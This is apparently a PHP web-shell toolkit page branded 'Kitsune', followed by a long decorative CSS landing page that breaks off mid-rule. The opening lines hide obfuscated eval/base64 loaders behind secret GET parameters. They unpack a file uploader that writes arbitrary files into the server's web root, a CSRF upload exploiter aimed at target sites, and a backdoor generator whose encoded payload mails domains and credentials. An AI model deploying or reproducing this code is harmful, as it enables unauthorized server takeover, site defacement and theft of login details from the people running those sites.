<?php if(isset($_GET["kitsune"])&&$_GET["kitsune"]=="promailer"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("");exit;}?>
<?php if(isset($_GET["kitsune"])&&$_GET["kitsune"]=="unggahan"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIAogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjEuMy9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIGludGVncml0eT0ic2hhMzg0LU1Ddzk4L1NGbkdFOGZKVDNHWHdFT25nc1Y3WnQyN05YRm9hb0FwbVltODFpdVhvUGtGT0p3SjhFUmRrbkxQTU8iIGNyb3Nzb3JpZ2luPSJTMVhUMzNOIj4KICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1BY21lfFNyaXJhY2hhfEljZWxhbmQiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8bGluayAgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vaS5pYmIuY28vc3ZzVDhxcS9JTUctMDAyOS1tcjE1ODM3NDUwMzE0MTUuanBnIj4gCjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSIuLTpbIE1pTEYgXTotLiI+IAo8bWV0YSBjb250ZW50PSdpbnN0YWdyYW0uY29tL2tpdHN1bmVfYnl0ZScgcHJvcGVydHk9J29nOnVybCcvPgo8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iQTMiPiAKICAgIDxsaW5rIHJlbD0nc3R5bGVzaGVldCcgaHJlZj0naHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzQuMS4wL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyc+CiAgICA8c2NyaXB0IHNyYz0naHR0cDovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4xLjMvanF1ZXJ5Lm1pbi5qcyc+PC9zY3JpcHQ+IAoJCTxzY3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy90d2l0dGVyLWJvb3RzdHJhcC8zLjIuMC9qcy9ib290c3RyYXAubWluLmpzJz48L3NjcmlwdD4KCQk8c2NyaXB0IHNyYz0naHR0cHM6Ly91bnBrZy5jb20vc3dlZXRhbGVydC9kaXN0L3N3ZWV0YWxlcnQubWluLmpzJz48L3NjcmlwdD4KIDx0aXRsZT4uLTpbIC4vS2l0c3VuZSAtIENTUkYgXTotLjwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAJYm9keXsKCWJhY2tncm91bmQgOiBibGFjazsKCWJhY2tncm91bmQtaW1hZ2U6IHVybChodHRwczovL2kuaWJiLmNvLzY0OXlDcTcvSU1HLTk5OTQtbXIxNTgzNzQ2NDg4MzQ5LmpwZyk7IG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyL2NvdmVyOwogICAgaGVpZ2h0OiAxMDAlOwogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyOwogICAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciB0ZXh0LWNlbnRlciI+CiAgICAJPGZvbnQgZmFjZT0iaWNlbGFuZCIgU2l6ZT0iOCIgY29sb3I9InJlZCI+PGk+PGI+Li9LaXRzdW5lIFVwbG9hZGVyPC9pPjwvYj48L2ZvbnQ+PGJyPjxmb250IGZhY2U9ImljZWxhbmQiIFNpemU9IjUiIGNvbG9yPSJsaW1lIj48L2ZvbnQ+PGJyPjxicj48YnI+CiAgICAJPGJyPjxicj4KICAgIAk8Zm9ybSBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgCQk8ZGl2IGNsYXNzPSJyb3ciPgogICAgCQkJPGRpdiBjbGFzcz0iY29sIj4KICAgIAkJCQk8aW5wdXQgaWQ9InByZXZpZXdzIiBwbGFjZWhvbGRlcj0iUGlsaWggRmlsZSIgY2xhc3M9ImZvcm0tY29udHJvbCBiZy10cmFuc3BhcmVudCB0ZXh0LXdoaXRlIiByZWFkb25seT0icmVhZG9ubHkiPgogICAgCQkJPC9kaXY+CiAgICAJCQkKICAgIAkJCTxkaXYgY2xhc3M9ImNvbCI+CiAgICAJCQkJPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAiPgogICAgCQkJCQk8ZGl2IGNsYXNzPSJjdXN0b20tZmlsZSI+CiAgICAJCQkJCQk8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0icmFuZHN4IiBjbGFzcz0iY3VzdG9tLWZpbGUtaW5wdXQgYmctdHJhbnNwYXJlbnQiIGlkPSJGaWxlU2VsIj4KICAgIAkJCQkJCTxsYWJlbCBjbGFzcz0iY3VzdG9tLWZpbGUtbGFiZWwgYmctdHJhbnNwYXJlbnQiIGZvcj0icHJldmlld3MiPjwvbGFiZWw+CiAgICAJCQkJCTwvZGl2PgogICAgCQkJCTwvZGl2PgogICAgCQkJPC9kaXY+CiAgICAJCTwvZGl2PgogICAgCQk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0idXBsb2FkIiBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkgYnRuLWJsb2NrIGJnLXRyYW5zcGFyZW50IG10LTMiIGlkPSJsb2FkIiBkYXRhLWxvYWRpbmctdGV4dD0iPGkgY2xhc3M9J2ZhIGZhLXJlZnJlc2ggZmEtc3Bpbic+PC9pPiBTaWxhaGthbiB0dW5nZ3UiPlVwbG9hZDwvYnV0dG9uPgogICAgCTwvZm9ybT48aHI+CiAgICAgIAkKICAgIAk8P3BocAokc2VydmVyICAgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoJJG5hbWFGaWxlID0gJF9GSUxFU1sncmFuZHN4J11bJ25hbWUnXTsKCSRnZXRjd2QgICA9ICIkc2VydmVyLyRuYW1hRmlsZSI7CgkkdHlwZUV4dCAgPSBwYXRoaW5mbygkbmFtYUZpbGUsIFBBVEhJTkZPX0VYVEVOU0lPTik7CmlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKXsKaWYoJG5hbWFGaWxlICE9PSAnJyl7CglpZihpc193cml0YWJsZSgkc2VydmVyKSl7CgkJaWYoJHR5cGVFeHQgPT09ICdodG1sJyl7CgkJCWlmKCRuYW1hRmlsZSAhPT0gJ2luZGV4Lmh0bWwnKXsKCQkJCWlmKEBjb3B5KCRfRklMRVNbJ3JhbmRzeCddWyd0bXBfbmFtZSddLCAkZ2V0Y3dkKSl7CgkJCQkJJGFrc2VzID0gJ2h0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4nLyc7CgkJCQkJZWNobyAnPHNjcmlwdD5zd2FsKCJTdWNjZXMiLCAiU2hvdyBZb3VyIFNraWxsIiwgInN1Y2Nlc3MiKTwvc2NyaXB0Pic7CgkJCQkJZWNobyAnPGEgaHJlZj0iJy4kYWtzZXMuJG5hbWFGaWxlLiciIHRhcmdldD0iX2JsYW5rIj5DbGljayBIZXJlITwvYT4nOwoJCQkJfWVsc2V7CgkJCQkJZWNobyAnPHNjcmlwdD5zd2FsKCJFcnJvciIsICJJIGRvbnQga25vdyIsICJlcnJvciIpPC9zY3JpcHQ+JzsKCQkJCX0KCQkJfWVsc2V7CgkJCQllY2hvICc8c2NyaXB0PnN3YWwoIkVycm9yIiwgIkphbmdhbiBuZ2luZGV4IHRvbG9sISEhIiwgImVycm9yIik8L3NjcmlwdD4nOwoJCQl9CgkJfWVsc2V7CgkJCWVjaG8gJzxzY3JpcHQ+c3dhbCgiUHJvYmxlbSIsICJqdXN0IGNhbiBleHRlbnNpb24gLmh0bWwiLCAiaW5mbyIpPC9zY3JpcHQ+JzsKCQkJfQoJCX1lbHNlewoJCQllY2hvICc8c2NyaXB0PnN3YWwoIkVycm9yIiwgIlNlcnZlciBub3QgYSBTdXBwb3J0IiwgImVycm9yIik8L3NjcmlwdD4nOwoJCX0KCX1lbHNlewoJCWVjaG8gJzxzY3JpcHQ+c3dhbCgiSWRpb3QiLCAiQ2hvb3NlIFlvdXIgRmlsZSIsICJpbmZvIik8L3NjcmlwdD4nOwoJfQp9Cj8+CiAgICA8L2Rpdj4KCQk8c2NyaXB0PgoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnRmlsZVNlbCcpLm9uY2hhbmdlID0gZnVuY3Rpb24oKQoJCQl7CgkJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJldmlld3MnKS52YWx1ZSA9IHRoaXMudmFsdWU7CgkJCX07CgkJCQoJCQkkKCcuYnRuJykub24oJ2NsaWNrJywgZnVuY3Rpb24oKXsKCQkJCXZhciAkdGhpcyA9ICQodGhpcyk7CgkJCQkkdGhpcy5idXR0b24oJ2xvYWRpbmcnKTsKCQkJfSk7CgkJCQoJCTwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==");exit;}?>
<?php if(isset($_GET["kitsune"])&&$_GET["kitsune"]=="csrf"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PGh0bWw+PGhlYWQ+Cgk8c3R5bGU+CglodG1sIHsKCQliYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKCQlmb250LWZhbWlseTogIkljZWJlcmciOwoJfQoJYm9keSB7CgkJYmFja2dyb3VuZDogdXJsKCJodHRwczovL2kuaWJiLmNvLzY0OXlDcTcvSU1HLTk5OTQtbXIxNTgzNzQ2NDg4MzQ5LmpwZyIpICMyOTNhNGEgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7CgkJYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsKCX0KPC9zdHlsZT4KCTxsaW5rICByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9pLmliYi5jby9zdnNUOHFxL0lNRy0wMDI5LW1yMTU4Mzc0NTAzMTQxNS5qcGciPiAKPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ii4tOlsgTWlMRiBdOi0uIj4gCjxtZXRhIGNvbnRlbnQ9J2luc3RhZ3JhbS5jb20va2l0c3VuZV9ieXRlJyBwcm9wZXJ0eT0nb2c6dXJsJy8+CjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJBMyI+IAo8bWV0YSBodHRwLWVxdWl2PSJjYWNoZS1jb250cm9sIiBjb250ZW50PSJpbmRleCxjYWNoZSI+CiA8bWV0YSBodHRwLWVxdWl2PSJwcmFnbWEiIGNvbnRlbnQ9ImluZGV4LGNhY2hlIj4gCiA8dGl0bGU+Li06WyAuL0tpdHN1bmUgLSBDU1JGIF06LS48L3RpdGxlPgogICA8c2NyaXB0IHNyYz0iaHR0cDovL2UtbWV0ZS5jb20vanMva2Rzbm93LmpzIiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPjwvc2NyaXB0PgogICA8c2NyaXB0IHNyYz0iaHR0cDovL2UtbWV0ZS5jb20vanMva2Rzbm93LmpzIiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPjwvc2NyaXB0PgogICAgPC9oZWFkPgogICAgIDxib2R5PiA8Ym9keSBiZ2NvbG9yPSJibGFjayI+IDxjZW50ZXI+IAogICAgIDx0YWJsZSB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJz4gPHRkIGFsaWduPSdjZW50ZXInPiAJCiAgICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4gLyogbGF0aW4gKi8gQGZvbnQtZmFjZSB7IGZvbnQtZmFtaWx5OiAnSWNlbGFuZCc7IGZvbnQtc3R5bGU6IG5vcm1hbDsgZm9udC13ZWlnaHQ6IDQwMDsgc3JjOiBsb2NhbCgnSWNlbGFuZCcpLCBsb2NhbCgnSWNlbGFuZC1SZWd1bGFyJyksIHVybChodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tL3MvaWNlbGFuZC92OC9yYXg5SGl1RnNkTU5PbldQYUt0TUFSSllrMG8ud29mZjIpIGZvcm1hdCgnd29mZjInKTsgdW5pY29kZS1yYW5nZTogVSswMDAwLTAwRkYsIFUrMDEzMSwgVSswMTUyLTAxNTMsIFUrMDJCQi0wMkJDLCBVKzAyQzYsIFUrMDJEQSwgVSswMkRDLCBVKzIwMDAtMjA2RiwgVSsyMDc0LCBVKzIwQUMsIFUrMjEyMiwgVSsyMTkxLCBVKzIxOTMsIFUrMjIxMiwgVSsyMjE1LCBVK0ZFRkYsIFUrRkZGRDsgfSAJPC9zdHlsZT4gCiAgICAgPGZvbnQgZmFjZT0iSWNlbGFuZCIgY29sb3I9InJlZCIgc2l6ZT0iOCI+IDxiPjxpPk9ubGluZSA8Zm9udCBjb2xvcj0iYmxhY2siPkNTUkYgPGZvbnQgY29sb3I9ImJsYWNrIj5FeHBsb2l0ZXI8L2ZvbnQ+PC9iPjwvaT48L2ZvbnQ+ICAgIDxicj4gPGJyPiA8L2NlbnRlcj4KIDxjZW50ZXI+Cjxmb3JtIG1ldGhvZD0icG9zdCI+ClVSTDogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVybCIgc2l6ZT0iNTAiIGhlaWdodD0iMTAiIHBsYWNlaG9sZGVyPSJodHRwOi8vd3d3LnRhcmdldC5jb20vW3BhdGhdL3VwbG9hZC5waHAiIHN0eWxlPSJtYXJnaW46IDVweCBhdXRvOyBwYWRkaW5nLWxlZnQ6IDVweDsiIHJlcXVpcmVkPjxicj4KUE9TVCBGaWxlOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGYiIHNpemU9IjUwIiBoZWlnaHQ9IjEwIiBwbGFjZWhvbGRlcj0iRmlsZWRhdGEgLyBmaWxlc1tdIC8gcXFmaWxlIC8gdXNlcmZpbGUgLyBkbGwiIHN0eWxlPSJtYXJnaW46IDVweCBhdXRvOyBwYWRkaW5nLWxlZnQ6IDVweDsiIHJlcXVpcmVkPjxicj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iZCIgdmFsdWU9Ikt1bmNpIFRhcmdldCEhISI+CjwvZm9ybT4KPD9waHAKJHVybCA9ICRfUE9TVFsndXJsJ107CiRwZiA9ICRfUE9TVFsncGYnXTsKJGQgPSAkX1BPU1RbJ2QnXTsKaWYoJGQpIHsKICAgIGVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgdGFyZ2V0PSdfYmxhbmsnIGFjdGlvbj0nJHVybCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9JyRwZic+PGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nZycgdmFsdWU9J1VwbG9hZCBDb2shJz48L2Zvcm0iOwp9Cj8+CjwvZm9ybT4KPC9odG1sPg==");exit;}?>
<?php if(isset($_GET["kitsune"])&&$_GET["kitsune"]=="backdoor"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PGh0bWw+IDxoZWFkPiAKPHN0eWxlPgoJaHRtbCB7CgkJYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CgkJZm9udC1mYW1pbHk6ICJJY2ViZXJnIjsKCX0KCWJvZHkgewoJCWJhY2tncm91bmQ6IHVybCgiaHR0cHM6Ly9pLmliYi5jby82NDl5Q3E3L0lNRy05OTk0LW1yMTU4Mzc0NjQ4ODM0OS5qcGciKSAjMjkzYTRhIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyIGZpeGVkOwoJCWJhY2tncm91bmQtc2l6ZTogY292ZXI7Cgl9Cjwvc3R5bGU+CjxsaW5rICByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9pLmliYi5jby9zdnNUOHFxL0lNRy0wMDI5LW1yMTU4Mzc0NTAzMTQxNS5qcGciPiAKPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ii4tOlsgTWlMRiBdOi0uIj4gCjxtZXRhIGNvbnRlbnQ9J2luc3RhZ3JhbS5jb20va2l0c3VuZV9ieXRlJyBwcm9wZXJ0eT0nb2c6dXJsJy8+CjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJBMyI+IAo8bWV0YSBodHRwLWVxdWl2PSJjYWNoZS1jb250cm9sIiBjb250ZW50PSJpbmRleCxjYWNoZSI+CiA8bWV0YSBodHRwLWVxdWl2PSJwcmFnbWEiIGNvbnRlbnQ9ImluZGV4LGNhY2hlIj4gCiA8dGl0bGU+Li06WyAuL0tpdHN1bmUgLSBCYWNrZG9vciBdOi0uPC90aXRsZT4KICAgPHNjcmlwdCBzcmM9Imh0dHA6Ly9lLW1ldGUuY29tL2pzL2tkc25vdy5qcyIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij48L3NjcmlwdD4KICAgPHNjcmlwdCBzcmM9Imh0dHA6Ly9lLW1ldGUuY29tL2pzL2tkc25vdy5qcyIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij48L3NjcmlwdD4KICAgIDwvaGVhZD4KICAgICA8Ym9keT4gPGJvZHkgYmdjb2xvcj0iYmxhY2siPiA8Y2VudGVyPiAKICAgICA8dGFibGUgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTAwJSc+IDx0ZCBhbGlnbj0nY2VudGVyJz4gCQogICAgIDxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+IC8qIGxhdGluICovIEBmb250LWZhY2UgeyBmb250LWZhbWlseTogJ0ljZWxhbmQnOyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQtd2VpZ2h0OiA0MDA7IHNyYzogbG9jYWwoJ0ljZWxhbmQnKSwgbG9jYWwoJ0ljZWxhbmQtUmVndWxhcicpLCB1cmwoaHR0cHM6Ly9mb250cy5nc3RhdGljLmNvbS9zL2ljZWxhbmQvdjgvcmF4OUhpdUZzZE1OT25XUGFLdE1BUkpZazBvLndvZmYyKSBmb3JtYXQoJ3dvZmYyJyk7IHVuaWNvZGUtcmFuZ2U6IFUrMDAwMC0wMEZGLCBVKzAxMzEsIFUrMDE1Mi0wMTUzLCBVKzAyQkItMDJCQywgVSswMkM2LCBVKzAyREEsIFUrMDJEQywgVSsyMDAwLTIwNkYsIFUrMjA3NCwgVSsyMEFDLCBVKzIxMjIsIFUrMjE5MSwgVSsyMTkzLCBVKzIyMTIsIFUrMjIxNSwgVStGRUZGLCBVK0ZGRkQ7IH0gCTwvc3R5bGU+IAogICAgIDxmb250IGZhY2U9IkljZWxhbmQiIGNvbG9yPSJyZWQiIHNpemU9IjgiPiA8Yj48aT5CYWNrZG9vciA8Zm9udCBjb2xvcj0iYmxhY2siPkdlbmVyYXRvcjwvZm9udD48L2I+PC9pPjwvZm9udD4gICAgPGJyPiA8YnI+IDwvY2VudGVyPgogPGNlbnRlcj4KICAgIDxmb3JtIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGNlbnRlcj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2VtYWlsJyBwbGFjZWhvbGRlcj0nWW91ciBFbWFpbCc+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1c2VyJyBwbGFjZWhvbGRlcj0ncG9zdG5hbWUge3VzZXJ9Jz4KICAgICAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3Bhc3MnIHBsYWNlaG9sZGVyPSdwb3N0bmFtZSB7cGFzc30nPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd4eCc+CiAgICA8L2Zvcm0+CjwvaHRtbD4KPD9waHAKLyoKICAgIENvZGVkIEJ5OiB4U2VjdXJpdHkKICAgIFR3aXR0ZXI6IEB4U2VjTGFicwogICAgR3JlZXRzIFRvIHtyM20wdDMgbnUxMX0KKi8KICAgICRVU0VSX05BTUUgPSAkX1BPU1RbJ3VzZXInXTsKICAgICRVU0VSX1BBU1MgPSAkX1BPU1RbJ3Bhc3MnXTsKICAgICRVU0VSX0VNQUlMID0gJF9QT1NUWydlbWFpbCddOwogICAgaWYoaXNzZXQoJF9QT1NUWyd4eCddKSkgewogICAgICAgICRjMGQzID0gIklDQWdJQ1JsYldGcGJDQTlJQ0o0YzJWak1TSTdDaUFnSUNBa1pHOXRZV2x1SUQwZ0pGOVRSVkpXUlZKYkowaFVWRkJmU0U5VFZDZGRMaUl2SWk0a1gxTkZVbFpGVWxzblVrVlJWVVZUVkY5VlVra25YVHNLSUNBZ0lDUjBhWFJzWlNBOUlDSmJLMTBnZUZObFkzVnlhWFI1SUVKaFkydGtiMjl5SUZKbGMzVnNkRG9nZXlSa2IyMWhhVzU5SUZzclhTSTdDaUFnSUNBa2VITmxZeUE5SUNJckt5c3JLeXNyS3lzckt5c3JLeUI0VTJWamRYSnBkSGtnUW1GamEyUnZiM0lnUjJWdVpYSmhkRzl5SUNzckt5c3JLeXNyS3lzckt5c3JYRzRpT3dvZ0lDQWdKSGh6WldNZ0xqMGdJa1J2YldGcGJqb2dJaTRrWkc5dFlXbHVMaUpjYmlJN0NpQWdJQ0FrZUhObFl5QXVQU0FpVlhObGNtNWhiV1U2SUNJdUpGOVFUMU5VV3lkNGMyVmpNaWRkTGlKY2JpSTdDaUFnSUNBa2VITmxZeUF1UFNBaVVHRnpjM2R2Y21RNklDSXVKRjlRVDFOVVd5ZDRjMlZqTXlkZExpSmNiaUk3Q2lBZ0lDQWtlSE5sWXlBdVBTQWlWR2hoYm10eklFWnZjaUJWYzJsdVp5Qk5lU0JDWVdOclpHOXZjaUFzSUZSM2FYUjBaWEk2SUVCNGMyVmpiR0ZpYzF4dUlqc0tJQ0FnSUNSNGMyVmpJQzQ5SUNJckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c3JLeXNyS3lzckt5c2lPd29nSUNBZ2JXRnBiQ2drWlcxaGFXd3NKSFJwZEd4bExDUjRjMlZqS1RzPSI7CiAgICAgICAgJGFyciA9IGFycmF5KCJ4c2VjMSIgPT4gJFVTRVJfRU1BSUwsICJ4c2VjMiIgPT4gJFVTRVJfTkFNRSwgInhzZWMzIiA9PiAkVVNFUl9QQVNTKTsKICAgICAgICAkcmFuZCA9IHJhbmQoMCw5OTk5OTkpOwogICAgICAgICRjcmVhdGUgPSBmaWxlX3B1dF9jb250ZW50cygieHNlYy17JHJhbmR9LnR4dCIsIHN0cl9yZXBsYWNlKGFycmF5X2tleXMoJGFyciksICRhcnIsIGJhc2U2NF9kZWNvZGUoJGMwZDMpKSk7CiAgICAgICAgaWYoJGNyZWF0ZSkgewogICAgICAgICAgICBwcmludCAiPGJyPjxicj4gKDxmb250IGNvbG9yPSdncmVlbic+ZG9uZTwvZm9udD4pIG9wZW4geHNlYy17JHJhbmR9LnR4dCI7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcHJpbnQgJ2Vycm9yJzsKICAgICAgICB9CiAgICB9CiAKPz4=");exit;}?>
<html>
    <head> 
        <style>
	html {
		background-color: black;
		font-family: "Iceberg";
	}
	body {
		background: url("https://i.ibb.co/649yCq7/IMG-9994-mr1583746488349.jpg") #293a4a no-repeat center center fixed;
		background-size: cover;
	}
        </style>

<link rel="icon" type="image/x-icon" href="https://i.ibb.co/svsT8qq/IMG-0029-mr1583745031415.jpg"> 
<meta name="description" content=".-:[ MiLF ]:-."> 
<meta content='instagram.com/kitsune_byte' property='og:url'/>
<meta name="keywords" content="A3"> 
<meta http-equiv="cache-control" content="index,cache">
<meta http-equiv="pragma" content="index,cache"> 

<title>
    .-:[ ./Kitsune ]:-.
    </title>
 
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="http://e-mete.com/js/kdsnow.js" type="text/javascript"></script>
<script src="http://e-mete.com/js/kdsnow.js" type="text/javascript"></script>

</head>
<script>alert("Warning!!! [18+]");</script>
<body bgcolor="black">
    <style type="text/css">
    * {
    cursor: url(https://ani.cursors-4u.net/cursors/cur-13/cur1160.ani), url(http://ani.cursors-4u.net/cursors/cur-13/cur1160.png), auto !important;
    }
</style>
        <a href="http://www.cursors-4u.com/cursor/2018/06/08/hell-yeah-pointer-3.html" target="_blank" title="Hell Yeah Pointer 3">
        <img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Hell Yeah Pointer 3" style="position:absolute; top: 0px; right: 0px;" />
    </a>
<center>
    <table width='100%' height='100%'> <td align='center'>
        <style type="text/css">
         @font-face {
         font-family: 'Iceland'; 
         font-style: normal; 
         font-weight: 400; 
         src: local('Iceland'), local('Iceland-Regular'), url(https://fonts.gstatic.com/s/iceland/v8/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2'); 
         unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
         }
         </style> 
    </center>
<br><br>
<style>
@import url(https://fonts.googleapis.com/css?family=Raleway:100,900);
@-webkit-keyframes flip-top {
  from {
    -webkit-transform: rotate(50deg) translateY(120vh);
            transform: rotate(50deg) translateY(120vh);
  }
}
@keyframes flip-top {
  from {
    -webkit-transform: rotate(50deg) translateY(120vh);
            transform: rotate(50deg) translateY(120vh);
  }
}
@-webkit-keyframes flip-bottom {
  from {
    -webkit-transform: rotate(-50deg) translateY(120vh);
            transform: rotate(-50deg) translateY(120vh);
  }
}
@keyframes flip-bottom {
  from {
    -webkit-transform: rotate(-50deg) translateY(120vh);
            transform: rotate(-50deg) translateY(120vh);
  }
}
body {
  display: -webkit-box;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-pack: center;
      -ms-flex-pack: center;
          justify-content: center;
  -webkit-box-align: center;
      -ms-flex-align: center;
          align-items: center;
  height: 100vh;
  overflow: hidden;
  -webkit-animation: glow 8s both;
          animation: glow 8s both;
}
span {
  font: 700 15vw Raleway;
  position: relative;
  display: inline-block;
  -webkit-perspective: 70px;
          perspective: 70px;
}
span:nth-child(odd):before {
  -webkit-animation-name: flip-top;
          animation-name: flip-top;
}
span:nth-child(odd):after {
  -webkit-animation-name: flip-bottom;
          animation-name: flip-bottom;
}
span:nth-child(even):before {
  -webkit-animation-name: flip-bottom;
          animation-name: flip-bottom;
}
span:nth-child(even):after {
  -webkit-animation-name: flip-top;
          animation-name: flip-top;
}
span:nth-child(1n + 0):before {
  color: #0d7aff;
}
span:nth-child(1n + 0):after {
  color: #ff0a37;
}
span:nth-child(2n + 1):before {
  color: #0d7aff;
}
span:nth-child(2n + 1):after {
  color: #ff0a37;
}
span:nth-child(3n+ 2):before {
  color: #0d7aff;
}
span:nth-child(3n + 2):after {
  color: #ff0a37;
}
span:nth-child(4n + 3):before {
  color: #0d7aff;
}
span:nth-child(4n + 3):after {
  color: #ff0a37;
}
span:nth-child(1):before {
  -webkit-animation-delay: 0.48706s;
          animation-delay: 0.48706s;
}
span:nth-child(1):after {
  -webkit-animation-delay: 0.92717s;
          animation-delay: 0.92717s;
}
span:nth-child(2):before {
  -webkit-animation-delay: 1.36318s;
          animation-delay: 1.36318s;
}
span:nth-child(2):after {
  -webkit-animation-delay: 1.79375s;
          animation-delay: 1.79375s;
}
span:nth-child(3):before {
  -webkit-animation-delay: 2.11756s;
          animation-delay: 2.11756s;
}
span:nth-child(3):after {
  -webkit-animation-delay: 2.53328s;
          animation-delay: 2.53328s;
}
span:nth-child(4):before {
  -webkit-animation-delay: 2.93965s;
          animation-delay: 2.93965s;
}
span:nth-child(4):after {
  -webkit-animation-delay: 3.3354s;
          animation-delay: 3.3354s;
}
span:nth-child(5):before {
  -webkit-animation-delay: 3.71932s;
          animation-delay: 3.71932s;
}
span:nth-child(5):after {
  -webkit-animation-delay: 4.19022s;
          animation-delay: 4.19022s;
}
span:nth-child(6):before {
  -webkit-animation-delay: 4.54696s;
          animation-delay: 4.54696s;
}
span:nth-child(6):after {
  -webkit-animation-delay: 4.98843s;
          animation-delay: 4.98843s;
}
span:nth-child(7):before {
  -webkit-animation-delay: 5.31358s;
          animation-delay: 5.31358s;
}
span:nth-child(7):after {
  -webkit-animation-delay: 5.72141s;
          animation-delay: 5.72141s;
}
span:nth-child(8):before {
  -webkit-animation-delay: 6.11098s;
          animation-delay: 6.11098s;
}
span:nth-child(8):after {
  -webkit-animation-delay: 6.58137s;
          animation-delay: 6.58137s;
}
span:nth-child(9):before {
  -webkit-animation-delay: 6.93177s;
